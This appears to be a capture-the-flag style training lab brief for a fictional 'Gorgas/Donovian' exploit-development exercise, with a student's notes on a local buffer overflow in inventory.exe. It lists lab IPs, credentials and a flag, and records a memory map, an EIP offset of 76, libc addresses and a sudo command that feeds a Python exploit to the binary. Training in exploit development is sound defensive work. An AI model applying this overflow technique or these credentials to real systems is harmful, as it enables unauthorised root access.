Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

    Python
    OllyDBG or an equivelent graphical program
        http://www.ollydbg.de/
    GNU Debugger's(GDB) Python Exploit Development Assistance Module
        https://github.com/longld/peda
    MetaSploit
        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>10.50.34.63
->T1: 192.168.28.111
->T2: 192.168.28.105

>10.50.34.63
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine
----------------------------------------
Situation: Other teams have extracted this networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.

Provided: Executable Package: inventory.exe
Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel.
Method: Utilize RE toolset and python to launch and develop exploit.

ASLR is disabled on the target machine.

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

Enter the contents of /.secret/.verysecret.pdb as the flag
----------------------------------------------------------------------
```shell
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/student/Downloads/inventory.exe
	 0x8049000  0x804a000     0x1000        0x0 /home/student/Downloads/inventory.exe
	 0x804a000  0x804b000     0x1000     0x1000 /home/student/Downloads/inventory.exe
	 0x804b000  0x806d000    0x22000        0x0 [heap]
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]


EBP: 0x41346341 ('Ac4A')
ESP: 0xffffd240 ("6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
EIP: 0x63413563 ('c5Ac')
 offset = 76
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB


0xf7de3b59
0xf7f588ab
0xf7f645fb

sudo ./func <<< $(python /home/student/Downloads/exploit.py)

scp comrade@192.168.28.111:/.hidden/inventory.exe

comrade :: StudentWebExploitPassword